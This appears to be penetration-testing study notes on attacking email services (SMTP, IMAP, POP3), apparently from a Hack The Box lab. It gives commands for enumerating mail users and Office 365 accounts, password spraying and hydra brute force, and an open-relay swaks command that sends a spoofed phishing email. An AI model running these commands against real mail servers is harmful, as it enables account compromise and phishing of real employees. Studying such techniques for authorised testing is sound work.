TCP/25 - SMTP unencrypted
TCP/143 IMAP4 unencrypted
TCP/110 POP3 unencrypted
TCP/465 SMTP encrypted
TCP/587 SMTP encrypted / starttls
TCP/993 IMAP4 encrypted
TCP/995 POP3 encrypted
##### Enumeration

```shell-session
sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128
```

Host - MX Records
```shell-session
host -t MX hackthebox.eu
```
```shell-session
host -t MX microsoft.com
```

Dig - MX Records
```shell-session
dig mx plaintext.do | grep "MX" | grep -v ";"
```
```shell-session
dig mx inlanefreight.com | grep "MX" | grep -v ";"
```

Host - A Records
```shell-session
host -t A mail1.inlanefreight.htb.
```

#### Authentication

VRFY Command - check if username is valid
```shell-session
telnet 10.10.110.20 25
```
```shell-session
VRFY root
```
```shell-session
VRFY www-data
```
```shell-session
VRFY new-user
```

EXPN Command - same as VRFY and list all users on distribution list
```shell-session
telnet 10.10.110.20 25
```
```shell-session
EXPN john
```
```shell-session
EXPN support-team
```

RCPT TO Command - send to multiple recipients
```shell-session
telnet 10.10.110.20 25
```
```shell-session
RCPT TO:julio
```
```shell-session
RCPT TO:kate
```
```shell-session
RCPT TO:john
```

USER Command - POP3 enumerate users
```shell-session
telnet 10.10.110.20 110
```
```shell-session
USER julio
```
```shell-session
USER john
```


##### Automate Enumeration
- smtp-user-enum
	- VRFY
	- EXPN
	- RCPT
```shell-session
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
```


##### Cloud Enumeration
- Microsoft Office 365
	- o365spray
		- https://github.com/0xZDH/o365spray
	- MailSniper
		- https://github.com/dafthack/MailSniper
- Gmail or Okta
	- CredKing
		- https://github.com/ustayready/CredKing

O365 Spray
```shell-session
python3 o365spray.py --validate --domain msplaintext.xyz
```
```shell-session
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
```
```shell-session
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```

##### Password Attacks
- hydra
	- SMTP
	- POP3
	- IMAP4

```shell-session
hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
```



#### Protocol Specifics Attacks

SMTP
- Open Relay (spoofing)
```shell-session
nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
```
```shell-session
swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
```


